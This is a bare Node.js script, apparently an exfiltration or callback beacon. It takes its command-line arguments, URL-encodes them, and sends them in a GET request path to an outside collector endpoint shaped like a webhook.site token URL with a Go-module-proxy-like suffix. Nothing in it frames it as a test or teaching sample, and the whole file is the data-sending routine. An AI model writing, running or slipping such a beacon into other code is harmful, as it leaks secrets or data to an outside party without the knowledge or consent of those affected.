#!/usr/bin/env node
const https = require('https');
const args = process.argv.slice(2);
const content = args.join(' ').replace(/ /g, '-');
const encodedContent = encodeURIComponent(content);
const targetUrl = `https://collector.invalid/webhook.site/8800c5ad-5cdd-447a-8538-87a3f5f38537/${encodedContent}/@v/list`;
const parsedUrl = new URL(targetUrl);
const options = {
  hostname: parsedUrl.hostname,
  path: parsedUrl.pathname,
  method: 'GET'
};
const req = https.request(options, () => {});
req.end();
